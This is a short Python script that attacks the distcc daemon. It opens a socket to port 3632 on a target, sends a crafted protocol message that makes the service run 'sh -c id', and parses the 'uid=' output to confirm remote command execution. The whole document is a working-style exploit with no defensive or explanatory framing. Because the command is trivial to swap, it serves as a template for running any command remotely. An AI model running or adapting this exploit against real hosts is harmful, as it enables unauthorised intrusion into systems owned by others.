import socket
import time

def exploit_distccd(target):
    print("[+] Attempting distccd RCE (port 3632)")

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target, 3632))

        payload = (
            b"DIST00000001"
            b"ARGC00000003"
            b"ARGV00000002sh"
            b"ARGV00000002-c"
            b"ARGV00000002id"
        )

        s.sendall(payload)

        time.sleep(1)

        output = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                output += chunk
                if b"uid=" in output:
                    break
        except socket.timeout:
            pass

        s.close()

        decoded = output.decode(errors="ignore")

        for line in decoded.splitlines():
            if "uid=" in line:
                return line.strip()

        return decoded.strip() if decoded else None

    except Exception as e:
        print(f"[-] distccd exploit failed: {e}")
        return None
